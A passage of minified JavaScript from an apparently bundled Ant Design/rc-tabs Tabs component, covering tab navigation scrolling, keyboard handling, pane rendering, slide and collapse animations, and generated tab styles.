t=0;t<P.length;t+=1){let{key:n}=P[t],o=X.get(n);o||(o=X.get(P[t-1]?.key)||aO);let a=e.get(n)||{...o};a.right=r-a.left-a.width,e.set(n,a)}return e},[P.map(e=>e.key).join("_"),X,r])),Z=lg(B,O),ee=lg(V,O),et=lg(U,O),er=lg(G,O),en=Math.floor(Z)<Math.floor(ee+et),eo=en?Z-er:Z-et,ea=`${E}-nav-operations-hidden`,ei=0,es=0;function el(e){return e<ei?ei:e>es?es:e}O&&p?(ei=0,es=Math.max(0,ee-eo)):(ei=Math.min(0,eo-ee),es=0);let ec=(0,b.useRef)(null),[eu,ed]=(0,b.useState)();function ep(){ed(Date.now())}function em(){ec.current&&clearTimeout(ec.current)}!function(e,t){let[r,n]=(0,b.useState)(),[o,a]=(0,b.useState)(0),[i,s]=(0,b.useState)(0),[l,c]=(0,b.useState)(),u=(0,b.useRef)(),d=(0,b.useRef)(),p=(0,b.useRef)(null);p.current={onTouchStart:function(e){let{screenX:t,screenY:r}=e.touches[0];n({x:t,y:r}),window.clearInterval(u.current)},onTouchMove:function(e){if(!r)return;let{screenX:i,screenY:l}=e.touches[0];n({x:i,y:l});let u=i-r.x,d=l-r.y;t(u,d);let p=Date.now();a(p),s(p-o),c({x:u,y:d})},onTouchEnd:function(){if(r&&(n(null),c(null),l)){let e=l.x/i,r=l.y/i;if(.1>Math.max(Math.abs(e),Math.abs(r)))return;let n=e,o=r;u.current=window.setInterval(()=>{.01>Math.abs(n)&&.01>Math.abs(o)?window.clearInterval(u.current):(n*=.9046104802746175,o*=.9046104802746175,t(20*n,20*o))},20)}},onWheel:function(e){let{deltaX:r,deltaY:n}=e,o=0,a=Math.abs(r),i=Math.abs(n);a===i?o="x"===d.current?r:n:a>i?(o=r,d.current="x"):(o=n,d.current="y"),t(-o,-o)&&e.preventDefault()}},b.useEffect(()=>{function t(e){p.current.onTouchMove(e)}function r(e){p.current.onTouchEnd(e)}return document.addEventListener("touchmove",t,{passive:!1}),document.addEventListener("touchend",r,{passive:!0}),e.current.addEventListener("touchstart",function(e){p.current.onTouchStart(e)},{passive:!0}),e.current.addEventListener("wheel",function(e){p.current.onWheel(e)},{passive:!1}),()=>{document.removeEventListener("touchmove",t),document.removeEventListener("touchend",r)}},[])}(R,(e,t)=>{var r,n,o,a;return!!en&&(O?(r=F,n=e,r(e=>el(e+n))):(o=H,a=t,o(e=>el(e+a))),em(),ep(),!0)}),(0,b.useEffect)(()=>(em(),eu&&(ec.current=setTimeout(()=>{ed(0)},100)),em),[eu]);let[ef,eg]=function(e,t,r,n,o,a,{tabs:i,tabPosition:s,rtl:l}){let c,u,d;return["top","bottom"].includes(s)?(c="width",u=l?"right":"left",d=Math.abs(r)):(c="height",u="top",d=-r),(0,b.useMemo)(()=>{if(!i.length)return[0,0];let r=i.length,n=r;for(let o=0;o<r;o+=1){let r=e.get(i[o].key)||aj;if(Math.floor(r[u]+r[c])>Math.floor(d+t)){n=o-1;break}}let o=0;for(let t=r-1;t>=0;t-=1)if((e.get(i[t].key)||aj)[u]<d){o=t+1;break}return o>n?[0,-1]:[o,n]},[e,t,n,o,a,d,s,i.map(e=>e.key).join("_"),l])}(Y,eo,O?N:j,ee,et,er,{...e,tabs:P}),eh=y((e=d)=>{let t=Y.get(e)||{width:0,height:0,left:0,right:0,top:0};if(O){let e=N;p?t.right<N?e=t.right:t.right+t.width>N+eo&&(e=t.right+t.width-eo):t.left<-N?e=-t.left:t.left+t.width>-N+eo&&(e=-(t.left+t.width-eo)),H(0),F(el(e))}else{let e=j;t.top<-j?e=-t.top:t.top+t.height>-j+eo&&(e=-(t.top+t.height-eo)),F(0),H(el(e))}}),[eb,ey]=(0,b.useState)(),[ev,eS]=(0,b.useState)(!1),ex=P.filter(e=>!e.disabled).map(e=>e.key),eC=e=>{let t=ex.indexOf(eb||d),r=ex.length;ey(ex[(t+e+r)%r])},ew=(e,t)=>{let r=ex.indexOf(e),n=P.find(t=>t.key===e);az(n?.closable,n?.closeIcon,f,n?.disabled)&&(t.preventDefault(),t.stopPropagation(),f.onEdit("remove",{key:e,event:t}),r===ex.length-1?eC(-1):eC(1))},ek=e=>{let{code:t}=e,r=p&&O,n=ex[0],o=ex[ex.length-1];switch(t){case"ArrowLeft":O&&eC(r?1:-1);break;case"ArrowRight":O&&eC(r?-1:1);break;case"ArrowUp":e.preventDefault(),O||eC(-1);break;case"ArrowDown":e.preventDefault(),O||eC(1);break;case"Home":e.preventDefault(),ey(n);break;case"End":e.preventDefault(),ey(o);break;case"Enter":case"Space":e.preventDefault(),x(eb??d,e);break;case"Backspace":case"Delete":ew(eb,e)}},e$={};O?e$.marginInlineStart=v:e$.marginTop=v;let eE=P.map((e,t)=>{let{key:r}=e;return b.createElement(lp,{id:c,prefixCls:E,key:r,tab:e,className:k?.item,style:0===t?$?.item:{...e$,...$?.item},closable:e.closable,editable:f,active:r===d,focus:r===eb,renderWrapper:S,removeAriaLabel:g?.removeAriaLabel,tabCount:ex.length,currentPosition:t+1,onClick:e=>{x(r,e)},onKeyDown:ek,onFocus:()=>{ev||ey(r),eh(r),ep(),R.current&&(p||(R.current.scrollLeft=0),R.current.scrollTop=0)},onBlur:()=>{ey(void 0)},onMouseDown:e=>{eS(!0),1===e.button&&ew(r,e)},onMouseUp:()=>{eS(!1)}})}),eP=()=>Q(()=>{let e=new Map,t=D.current?.getBoundingClientRect();return P.forEach(({key:r})=>{let n=D.current?.querySelector(`[data-node-key="${aB(r)}"]`);if(n){let[o,a,i,s]=((e,t)=>{let{offsetWidth:r,offsetHeight:n,offsetTop:o,offsetLeft:a}=e,{width:i,height:s,left:l,top:c}=e.getBoundingClientRect();return 1>Math.abs(i-r)?[i,s,l-t.left,c-t.top]:[r,n,a,o]})(n,t);e.set(r,{width:o,height:a,left:i,top:s})}}),e});(0,b.useEffect)(()=>{eP()},[P.map(e=>e.key).join("_")]);let eT=aF(()=>{let e=lf(T),t=lf(I),r=lf(M);z([e[0]-t[0]-r[0],e[1]-t[1]-r[1]]);let n=lf(_);q(n),J(lf(L));let o=lf(D);W([o[0]-n[0],o[1]-n[1]]),eP()}),eI=[...P.slice(0,ef),...P.slice(eg+1)],eM=Y.get(d),{style:eR}=(e=>{let{activeTabOffset:t,horizontal:r,rtl:n,indicator:o={}}=e,{size:a,align:i="center"}=o,[s,l]=(0,b.useState)(),c=(0,b.useRef)(),u=b.default.useCallback(e=>"function"==typeof a?a(e):"number"==typeof a?a:e,[a]);function d(){oU.cancel(c.current)}return(0,b.useEffect)(()=>{let e={};if(t)if(r){e.width=u(t.width);let r=n?"right":"left";"start"===i&&(e[r]=t[r]),"center"===i&&(e[r]=t[r]+t.width/2,e.transform=n?"translateX(50%)":"translateX(-50%)"),"end"===i&&(e[r]=t[r]+t.width,e.transform="translateX(-100%)")}else e.height=u(t.height),"start"===i&&(e.top=t.top),"center"===i&&(e.top=t.top+t.height/2,e.transform="translateY(-50%)"),"end"===i&&(e.top=t.top+t.height,e.transform="translateY(-100%)");return d(),c.current=oU(()=>{s&&e&&Object.keys(e).every(t=>{let r=e[t],n=s[t];return"number"==typeof r&&"number"==typeof n?Math.round(r)===Math.round(n):r===n})||l(e)}),d},[JSON.stringify(t),r,n,i,u]),{style:s}})({activeTabOffset:eM,horizontal:O,indicator:w,rtl:p});(0,b.useEffect)(()=>{eh()},[d,ei,es,aH(eM),aH(Y),O]),(0,b.useEffect)(()=>{eT()},[p]);let eA=!!eI.length,eD=`${E}-nav-wrap`;return O?p?(o=N>0,n=N!==es):(n=N<0,o=N!==ei):(a=j<0,i=j!==ei),b.createElement(a_,{onResize:eT},b.createElement("div",{ref:A(t,T),role:"tablist","aria-orientation":O?"horizontal":"vertical",className:K(`${E}-nav`,s,k?.header),style:{...$?.header,...l},onKeyDown:()=>{ep()}},b.createElement(aW,{ref:I,position:"left",extra:m,prefixCls:E}),b.createElement(a_,{onResize:eT},b.createElement("div",{className:K(eD,{[`${eD}-ping-left`]:n,[`${eD}-ping-right`]:o,[`${eD}-ping-top`]:a,[`${eD}-ping-bottom`]:i}),ref:R},b.createElement(a_,{onResize:eT},b.createElement("div",{ref:D,className:`${E}-nav-list`,style:{transform:`translate(${N}px, ${j}px)`,transition:eu?"none":void 0}},eE,b.createElement(aV,{ref:_,prefixCls:E,locale:g,editable:f,style:{...0===eE.length?void 0:e$,visibility:eA?"hidden":null}}),b.createElement("div",{className:K(`${E}-ink-bar`,k?.indicator,{[`${E}-ink-bar-animated`]:u.inkBar}),style:{...eR,...$?.indicator}}))))),b.createElement(ld,lm({},e,{removeAriaLabel:g?.removeAriaLabel,ref:L,prefixCls:E,tabs:eI,className:!eA&&ea,popupStyle:$?.popup,tabMoving:!!eu})),b.createElement(aW,{ref:M,position:"right",extra:m,prefixCls:E})))}),lb=({renderTabBar:e,...t})=>e?e(t,lh):b.createElement(lh,t),ly=b.forwardRef((e,t)=>{let{prefixCls:r,className:n,style:o,id:a,active:i,tabKey:s,children:l}=e,c=b.Children.count(l)>0;return b.createElement("div",{id:a&&`${a}-panel-${s}`,role:"tabpanel",tabIndex:i&&c?0:-1,"aria-labelledby":a&&`${a}-tab-${s}`,"aria-hidden":!i,style:o,className:K(r,i&&`${r}-active`,n),ref:t},l)});function lv(){return(lv=Object.assign.bind()).apply(this,arguments)}let lS=e=>{let{id:t,activeKey:r,animated:n,tabPosition:o,destroyOnHidden:a,contentStyle:i,contentClassName:s}=e,{prefixCls:l,tabs:c}=b.useContext(a$),u=n.tabPane,d=`${l}-tabpane`;return b.createElement("div",{className:K(`${l}-content-holder`)},b.createElement("div",{className:K(`${l}-content`,`${l}-content-${o}`,{[`${l}-content-animated`]:u})},c.map(e=>{let{key:o,forceRender:l,style:c,className:p,destroyOnHidden:m,...f}=e,g=o===r;return b.createElement(iC,lv({key:o,visible:g,forceRender:l,removeOnLeave:!!(a??m),leavedClassName:`${d}-hidden`},n.tabPaneMotion),({style:e,className:r},n)=>b.createElement(ly,lv({},f,{prefixCls:d,id:t,tabKey:o,animated:u,active:g,style:{...i,...c,...e},className:K(s,p,r),ref:n})))})))};function lx(){return(lx=Object.assign.bind()).apply(this,arguments)}let lC=0,lw=b.forwardRef((e,t)=>{let{id:n,prefixCls:o="rc-tabs",className:a,items:i,direction:s,activeKey:l,defaultActiveKey:c,editable:u,animated:d,tabPosition:p="top",tabBarGutter:m,tabBarStyle:f,tabBarExtraContent:g,locale:h,more:y,destroyOnHidden:v,renderTabBar:S,onChange:x,onTabClick:C,onTabScroll:k,getPopupContainer:$,popupClassName:E,indicator:P,classNames:T,styles:I,...M}=e,R=b.useMemo(()=>(i||[]).filter(e=>e&&"object"==typeof e&&"key"in e),[i]),A="rtl"===s,D=function(e={inkBar:!0,tabPane:!1}){let t;return(t=!1===e?{inkBar:!1,tabPane:!1}:!0===e?{inkBar:!0,tabPane:!1}:{inkBar:!0,..."object"==typeof e?e:{}}).tabPaneMotion&&void 0===t.tabPane&&(t.tabPane=!0),!t.tabPaneMotion&&t.tabPane&&(t.tabPane=!1),t}(d),[L,_]=(0,b.useState)(!1);(0,b.useEffect)(()=>{_((void 0===r&&(r=(0,ak.default)()),r))},[]);let[O,N]=w(c??R[0]?.key,l),[F,j]=(0,b.useState)(()=>R.findIndex(e=>e.key===O));(0,b.useEffect)(()=>{let e=R.findIndex(e=>e.key===O);-1===e&&(e=Math.max(0,Math.min(F,R.length-1)),N(R[e]?.key)),j(e)},[R.map(e=>e.key).join("_"),O,F]);let[H,B]=w(null,n);(0,b.useEffect)(()=>{n||(B(`rc-tabs-${lC}`),lC+=1)},[]);let z={id:H,activeKey:O,animated:D,tabPosition:p,rtl:A,mobile:L},V={...z,editable:u,locale:h,more:y,tabBarGutter:m,onTabClick:function(e,t){C?.(e,t);let r=e!==O;N(e),r&&x?.(e)},onTabScroll:k,extra:g,style:f,getPopupContainer:$,popupClassName:K(E,T?.popup),indicator:P,styles:I,classNames:T},W=b.useMemo(()=>({tabs:R,prefixCls:o}),[R,o]);return b.createElement(a$.Provider,{value:W},b.createElement("div",lx({ref:t,id:n,className:K(o,`${o}-${p}`,{[`${o}-mobile`]:L,[`${o}-editable`]:u,[`${o}-rtl`]:A},a)},M),b.createElement(lb,lx({},V,{renderTabBar:S})),b.createElement(lS,lx({destroyOnHidden:v},z,{contentStyle:I?.content,contentClassName:T?.content,animated:D}))))}),lk=e=>`${e}-css-var`;e.s(["default",0,lk],21883);let l$=()=>({height:0,opacity:0}),lE=e=>{let{scrollHeight:t}=e;return{height:t,opacity:1}},lP=e=>({height:e?e.offsetHeight:0}),lT=(e,t)=>t?.deadline===!0||"height"===t.propertyName,lI=(e,t,r)=>void 0!==r?r:`${e}-${t}`;e.s(["default",0,(e=Q)=>({motionName:`${e}-motion-collapse`,onAppearStart:l$,onEnterStart:l$,onAppearActive:lE,onEnterActive:lE,onLeaveStart:lP,onLeaveActive:l$,onAppearEnd:lT,onEnterEnd:lT,onLeaveEnd:lT,motionDeadline:500}),"getTransitionName",()=>lI],13541);let lM={motionAppear:!1,motionEnter:!0,motionLeave:!0},lR=e=>({animationDuration:e,animationFillMode:"both"}),lA=(e,t,r,n,o=!1)=>{let a=o?"&":"";return{[`
      ${a}${e}-enter,
      ${a}${e}-appear
    `]:{...lR(n),animationPlayState:"paused"},[`${a}${e}-leave`]:{...lR(n),animationPlayState:"paused"},[`
      ${a}${e}-enter${e}-enter-active,
      ${a}${e}-appear${e}-appear-active
    `]:{animationName:t,animationPlayState:"running"},[`${a}${e}-leave${e}-leave-active`]:{animationName:r,animationPlayState:"running",pointerEvents:"none"}}};e.s(["initMotion",0,lA],2366);let lD=new rD("antSlideUpIn",{"0%":{transform:"scaleY(0.8)",transformOrigin:"0% 0%",opacity:0},"100%":{transform:"scaleY(1)",transformOrigin:"0% 0%",opacity:1}}),lL=new rD("antSlideUpOut",{"0%":{transform:"scaleY(1)",transformOrigin:"0% 0%",opacity:1},"100%":{transform:"scaleY(0.8)",transformOrigin:"0% 0%",opacity:0}}),l_=new rD("antSlideDownIn",{"0%":{transform:"scaleY(0.8)",transformOrigin:"100% 100%",opacity:0},"100%":{transform:"scaleY(1)",transformOrigin:"100% 100%",opacity:1}}),lO=new rD("antSlideDownOut",{"0%":{transform:"scaleY(1)",transformOrigin:"100% 100%",opacity:1},"100%":{transform:"scaleY(0.8)",transformOrigin:"100% 100%",opacity:0}}),lN={"slide-up":{inKeyframes:lD,outKeyframes:lL},"slide-down":{inKeyframes:l_,outKeyframes:lO},"slide-left":{inKeyframes:new rD("antSlideLeftIn",{"0%":{transform:"scaleX(0.8)",transformOrigin:"0% 0%",opacity:0},"100%":{transform:"scaleX(1)",transformOrigin:"0% 0%",opacity:1}}),outKeyframes:new rD("antSlideLeftOut",{"0%":{transform:"scaleX(1)",transformOrigin:"0% 0%",opacity:1},"100%":{transform:"scaleX(0.8)",transformOrigin:"0% 0%",opacity:0}})},"slide-right":{inKeyframes:new rD("antSlideRightIn",{"0%":{transform:"scaleX(0.8)",transformOrigin:"100% 0%",opacity:0},"100%":{transform:"scaleX(1)",transformOrigin:"100% 0%",opacity:1}}),outKeyframes:new rD("antSlideRightOut",{"0%":{transform:"scaleX(1)",transformOrigin:"100% 0%",opacity:1},"100%":{transform:"scaleX(0.8)",transformOrigin:"100% 0%",opacity:0}})}},lF=(e,t)=>{let{antCls:r}=e,n=`${r}-${t}`,{inKeyframes:o,outKeyframes:a}=lN[t];return[lA(n,o,a,e.motionDurationMid),{[`
      ${n}-enter,
      ${n}-appear
    `]:{transform:"scale(0)",transformOrigin:"0% 0%",opacity:0,animationTimingFunction:e.motionEaseOutQuint,"&-prepare":{transform:"scale(1)"}},[`${n}-leave`]:{animationTimingFunction:e.motionEaseInQuint}}]};e.s(["initSlideMotion",0,lF,"slideDownIn",0,l_,"slideDownOut",0,lO,"slideUpIn",0,lD,"slideUpOut",0,lL],64142);let lj=nA("Tabs",e=>{let t=r8(e,{tabsCardPadding:e.cardPadding,dropdownEdgeChildVerticalPadding:e.paddingXXS,tabsDropdownHeight:200,tabsDropdownWidth:120,tabsHorizontalItemMargin:`0 0 0 ${tj(e.horizontalItemGutter)}`,tabsHorizontalItemMarginRTL:`0 0 0 ${tj(e.horizontalItemGutter)}`});return[(e=>{let{componentCls:t,cardPaddingSM:r,cardPaddingLG:n,cardHeightSM:o,cardHeightLG:a,horizontalItemPaddingSM:i,horizontalItemPaddingLG:s}=e;return{[t]:{"&-small":{[`> ${t}-nav`]:{[`${t}-tab`]:{padding:i,fontSize:e.titleFontSizeSM}}},"&-large":{[`> ${t}-nav`]:{[`${t}-tab`]:{padding:s,fontSize:e.titleFontSizeLG,lineHeight:e.lineHeightLG}}}},[`${t}-card`]:{[`&${t}-small`]:{[`> ${t}-nav`]:{[`${t}-tab`]:{padding:r},[`${t}-nav-add`]:{minWidth:o,minHeight:o}},[`&${t}-bottom`]:{[`> ${t}-nav ${t}-tab`]:{borderRadius:`0 0 ${tj(e.borderRadius)} ${tj(e.borderRadius)}`}},[`&${t}-top`]:{[`> ${t}-nav ${t}-tab`]:{borderRadius:`${tj(e.borderRadius)} ${tj(e.borderRadius)} 0 0`}},[`&${t}-right`]:{[`> ${t}-nav ${t}-tab`]:{borderRadius:{_skip_check_:!0,value:`0 ${tj(e.borderRadius)} ${tj(e.borderRadius)} 0`}}},[`&${t}-left`]:{[`> ${t}-nav ${t}-tab`]:{borderRadius:{_skip_check_:!0,value:`${tj(e.borderRadius)} 0 0 ${tj(e.borderRadius)}`}}}},[`&${t}-large`]:{[`> ${t}-nav`]:{[`${t}-tab`]:{padding:n},[`${t}-nav-add`]:{minWidth:a,minHeight:a}}}}}})(t),(e=>{let{componentCls:t,tabsHorizontalItemMarginRTL:r,iconCls:n,cardGutter:o,calc:a}=e;return{[`${t}-rtl`]:{direction:"rtl",[`${t}-nav`]:{[`${t}-tab`]:{margin:{_skip_check_:!0,value:r},[`${t}-tab:last-of-type`]:{marginLeft:{_skip_check_:!0,value:0}},[n]:{marginRight:{_skip_check_:!0,value:0},marginLeft:{_skip_check_:!0,value:tj(e.marginSM)}},[`${t}-tab-remove`]:{marginRight:{_skip_check_:!0,value:tj(e.marginXS)},marginLeft:{_skip_check_:!0,value:tj(a(e.marginXXS).mul(-1).equal())},[n]:{margin:0}}}},[`&${t}-left`]:{[`> ${t}-nav`]:{order:1},[`> ${t}-content-holder`]:{order:0}},[`&${t}-right`]:{[`> ${t}-nav`]:{order:0},[`> ${t}-content-holder`]:{order:1}},[`&${t}-card${t}-top, &${t}-card${t}-bottom`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-tab + ${t}-tab`]:{marginRight:{_skip_check_:!0,value:o},marginLeft:{_skip_check_:!0,value:0}}}}},[`${t}-dropdown-rtl`]:{direction:"rtl"},[`${t}-menu-item`]:{[`${t}-dropdown-rtl`]:{textAlign:{_skip_check_:!0,value:"right"}}}}})(t),(e=>{let{componentCls:t,margin:r,colorBorderSecondary:n,horizontalMargin:o,verticalItemPadding:a,verticalItemMargin:i,motionDurationSlow:s,calc:l}=e;return{[`${t}-top, ${t}-bottom`]:{flexDirection:"column",[`> ${t}-nav, > div > ${t}-nav`]:{margin:o,"&::before":{position:"absolute",right:{_skip_check_:!0,value:0},left:{_skip_check_:!0,value:0},borderBottom:`${tj(e.lineWidth)} ${e.lineType} ${n}`,content:"''"},[`${t}-ink-bar`]:{height:e.lineWidthBold,"&-animated":{transition:["width","left","right"].map(e=>`${e} ${s}`).join(", ")}},[`${t}-nav-wrap`]:{"&::before, &::after":{top:0,bottom:0,width:e.controlHeight},"&::before":{left:{_skip_check_:!0,value:0},boxShadow:e.boxShadowTabsOverflowLeft},"&::after":{right:{_skip_check_:!0,value:0},boxShadow:e.boxShadowTabsOverflowRight},[`&${t}-nav-wrap-ping-left::before`]:{opacity:1},[`&${t}-nav-wrap-ping-right::after`]:{opacity:1}}}},[`${t}-top`]:{[`> ${t}-nav,
        > div > ${t}-nav`]:{"&::before":{bottom:0},[`${t}-ink-bar`]:{bottom:0}}},[`${t}-bottom`]:{[`> ${t}-nav, > div > ${t}-nav`]:{order:1,marginTop:r,marginBottom:0,"&::before":{top:0},[`${t}-ink-bar`]:{top:0}},[`> ${t}-content-holder, > div > ${t}-content-holder`]:{order:0}},[`${t}-left, ${t}-right`]:{[`> ${t}-nav, > div > ${t}-nav`]:{flexDirection:"column",minWidth:l(e.controlHeight).mul(1.25).equal(),[`${t}-tab`]:{padding:a,textAlign:"center"},[`${t}-tab + ${t}-tab`]:{margin:i},[`${t}-nav-wrap`]:{flexDirection:"column","&::before, &::after":{right:{_skip_check_:!0,value:0},left:{_skip_check_:!0,value:0},height:e.controlHeight},"&::before":{top:0,boxShadow:e.boxShadowTabsOverflowTop},"&::after":{bottom:0,boxShadow:e.boxShadowTabsOverflowBottom},[`&${t}-nav-wrap-ping-top::before`]:{opacity:1},[`&${t}-nav-wrap-ping-bottom::after`]:{opacity:1}},[`${t}-ink-bar`]:{width:e.lineWidthBold,"&-animated":{transition:["height","top"].map(e=>`${e} ${s}`).join(", ")}},[`${t}-nav-list, ${t}-nav-operations`]:{flex:"1 0 auto",flexDirection:"column"}}},[`${t}-left`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-ink-bar`]:{right:{_skip_check_:!0,value:0}}},[`> ${t}-content-holder, > div > ${t}-content-holder`]:{marginLeft:{_skip_check_:!0,value:tj(l(e.lineWidth).mul(-1).equal())},borderLeft:{_skip_check_:!0,value:`${tj(e.lineWidth)} ${e.lineType} ${e.colorBorder}`},[`> ${t}-content > ${t}-tabpane`]:{paddingLeft:{_skip_check_:!0,value:e.paddingLG}}}},[`${t}-right`]:{[`> ${t}-nav, > div > ${t}-nav`]:{order:1,[`${t}-ink-bar`]:{left:{_skip_check_:!0,value:0}}},[`> ${t}-content-holder, > div > ${t}-content-holder`]:{order:0,marginRight:{_skip_check_:!0,value:l(e.lineWidth).mul(-1).equal()},borderRight:{_skip_check_:!0,value:`${tj(e.lineWidth)} ${e.lineType} ${e.colorBorder}`},[`> ${t}-content > ${t}-tabpane`]:{paddingRight:{_skip_check_:!0,value:e.paddingLG}}}}}})(t),(e=>{let{componentCls:t,itemHoverColor:r,dropdownEdgeChildVerticalPadding:n}=e;return{[`${t}-dropdown`]:{...na(e),position:"absolute",top:-9999,left:{_skip_check_:!0,value:-9999},zIndex:e.zIndexPopup,display:"block","&-hidden":{display:"none"},[`${t}-dropdown-menu`]:{maxHeight:e.tabsDropdownHeight,margin:0,padding:`${tj(n)} 0`,overflowX:"hidden",overflowY:"auto",textAlign:{_skip_check_:!0,value:"left"},listStyleType:"none",backgroundColor:e.colorBgContainer,backgroundClip:"padding-box",borderRadius:e.borderRadiusLG,outline:"none",boxShadow:e.boxShadowSecondary,"&-item":{...no,display:"flex",alignItems:"center",minWidth:e.tabsDropdownWidth,margin:0,padding:`${tj(e.paddingXXS)} ${tj(e.paddingSM)}`,color:e.colorText,fontWeight:"normal",fontSize:e.fontSize,lineHeight:e.lineHeight,cursor:"pointer",transition:`all ${e.motionDurationSlow}`,"> span":{flex:1,whiteSpace:"nowrap"},"&-remove":{flex:"none",marginLeft:{_skip_check_:!0,value:e.marginSM},color:e.colorIcon,fontSize:e.fontSizeSM,background:"transparent",border:0,cursor:"pointer","&:hover":{color:r}},"&:hover":{background:e.controlItemBgHover},"&-disabled":{"&, &:hover":{color:e.colorTextDisabled,background:"transparent",cursor:"not-allowed"}}}}}}})(t),(e=>{let{componentCls:t,tabsCardPadding:r,cardBg:n,cardGutter:o,colorBorderSecondary:a,itemSelectedColor:i}=e;return{[`${t}-card`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-tab`]:{margin:0,padding:r,background:n,border:`${tj(e.lineWidth)} ${e.lineType} ${a}`,transition:`all ${e.motionDurationSlow} ${e.motionEaseInOut}`},[`${t}-tab-active`]:{color:i,background:e.colorBgContainer},[`${t}-tab-focus:has(${t}-tab-btn:focus-visible)`]:nu(e,-3),[`& ${t}-tab${t}-tab-focus ${t}-tab-btn:focus-visible`]:{outline:"none"},[`${t}-ink-bar`]:{visibility:"hidden"}},[`&${t}-top, &${t}-bottom`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-tab + ${t}-tab`]:{marginLeft:{_skip_check_:!0,value:tj(o)}}}},[`&${t}-top`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-tab`]:{borderRadius:`${tj(e.borderRadiusLG)} ${tj(e.borderRadiusLG)} 0 0`},[`${t}-tab-active`]:{borderBottomColor:e.colorBgContainer}}},[`&${t}-bottom`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-tab`]:{borderRadius:`0 0 ${tj(e.borderRadiusLG)} ${tj(e.borderRadiusLG)}`},[`${t}-tab-active`]:{borderTopColor:e.colorBgContainer}}},[`&${t}-left, &${t}-right`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-tab + ${t}-tab`]:{marginTop:tj(o)}}},[`&${t}-left`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-tab`]:{borderRadius:{_skip_check_:!0,value:`${tj(e.borderRadiusLG)} 0 0 ${tj(e.borderRadiusLG)}`}},[`${t}-tab-active`]:{borderRightColor:{_skip_check_:!0,value:e.colorBgContainer}}}},[`&${t}-right`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-tab`]:{borderRadius:{_skip_check_:!0,value:`0 ${tj(e.borderRadiusLG)} ${tj(e.borderRadiusLG)} 0`}},[`${t}-tab-active`]:{borderLeftColor:{_skip_check_:!0,value:e.colorBgContainer}}}}}}})(t),(e=>{let{componentCls:t,tabsCardPadding:r,cardHeight:n,cardGutter:o,itemHoverColor:a,itemActiveColor:i,colorBorderSecondary:s}=e;return{[t]:{...na(e),display:"flex",[`> ${t}-nav, > div > ${t}-nav`]:{position:"relative",display:"flex",flex:"none",alignItems:"center",[`${t}-nav-wrap`]:{position:"relative",display:"flex",flex:"auto",alignSelf:"stretch",overflow:"hidden",whiteSpace:"nowrap",transform:"translate(0)","&::before, &::after":{position:"absolute",zIndex:1,opacity:0,transition:`opacity ${e.motionDurationSlow}`,content:"''",pointerEvents:"none"}},[`${t}-nav-list`]:{position:"relative",display:"flex",transition:`opacity ${e.motionDurationSlow}`},[`${t}-nav-operations`]:{display:"flex",alignSelf:"stretch"},[`${t}-nav-operations-hidden`]:{position:"absolute",visibility:"hidden",pointerEvents:"none"},[`${t}-nav-more`]:{position:"relative",padding:r,background:"transparent",border:0,color:e.colorText,"&::after":{position:"absolute",right:{_skip_check_:!0,value:0},bottom:0,left:{_skip_check_:!0,value:0},height:e.calc(e.controlHeightLG).div(8).equal(),transform:"translateY(100%)",content:"''"}},[`${t}-nav-add`]:{minWidth:n,minHeight:n,marginLeft:{_skip_check_:!0,value:o},background:"transparent",border:`${tj(e.lineWidth)} ${e.lineType} ${s}`,borderRadius:`${tj(e.borderRadiusLG)} ${tj(e.borderRadiusLG)} 0 0`,outline:"none",cursor:"pointer",color:e.colorText,transition:`all ${e.motionDurationSlow} ${e.motionEaseInOut}`,"&:hover":{color:a},"&:active, &:focus:not(:focus-visible)":{color:i},...nd(e,-3)}},[`${t}-extra-content`]:{flex:"none"},[`${t}-ink-bar`]:{position:"absolute",background:e.inkBarColor,pointerEvents:"none"},...(e=>{let{componentCls:t,itemActiveColor:r,itemHoverColor:n,iconCls:o,tabsHorizontalItemMargin:a,horizontalItemPadding:i,itemSelectedColor:s,itemColor:l}=e,c=`${t}-tab`;return{[c]:{position:"relative",WebkitTouchCallout:"none",WebkitTapHighlightColor:"transparent",display:"inline-flex",alignItems:"center",padding:i,fontSize:e.titleFontSize,background:"transparent",border:0,outline:"none",cursor:"pointer",color:l,"&-btn, &-remove":{"&:focus:not(:focus-visible), &:active":{color:r}},"&-btn":{outline:"none",transition:`all ${e.motionDurationSlow}`,[`${c}-icon:not(:last-child)`]:{marginInlineEnd:e.marginSM}},"&-remove":{flex:"none",lineHeight:1,marginRight:{_skip_check_:!0,value:e.calc(e.marginXXS).mul(-1).equal()},marginLeft:{_skip_check_:!0,value:e.marginXS},color:e.colorIcon,fontSize:e.fontSizeSM,background:"transparent",border:"none",outline:"none",cursor:"pointer",transition:`all ${e.motionDurationSlow}`,"&:hover":{color:e.colorTextHeading},...nd(e)},"&:hover":{color:n},[`&${c}-active ${c}-btn`]:{color:s},[`&${c}-focus ${c}-btn:focus-visible`]:nu(e),[`&${c}-disabled`]:{color:e.colorTextDisabled,cursor:"not-allowed"},[`&${c}-disabled ${c}-btn, &${c}-disabled ${t}-remove`]:{"&:focus, &:active":{color:e.colorTextDisabled}},[`& ${c}-remove ${o}`]:{margin:0,verticalAlign:"middle"},[`${o}:not(:last-child)`]:{marginRight:{_skip_check_:!0,value:e.marginSM}}},[`${c} + ${c}`]:{margin:{_skip_check_:!0,value:a}}}})(e),[`${t}-content`]:{position:"relative",width:"100%"},[`${t}-content-holder`]:{flex:"auto",minWidth:0,minHeight:0},[`${t}-tabpane`]:{...nd(e),"&-hidden":{display:"none"}}},[`${t}-centered`]:{[`> ${t}-nav, > div > ${t}-nav`]:{[`${t}-nav-wrap`]:{[`&:not([class*='${t}-nav-wrap-ping']) > ${t}-nav-list`]:{margin:"auto"}}}}}})(t),(e=>{let{componentCls:t,motionDurationSlow:r}=e;return[{[t]:{[`${t}-switch`]:{"&-appear, &-enter":{transition:"none","&-start":{opacity:0},"&-active":{opacity:1,transition:`opacity ${r}`}},"&-leave":{position:"absolute",transition:"none",inset:0,"&-start":{opacity:1},"&-active":{opacity:0,transition:`opacity 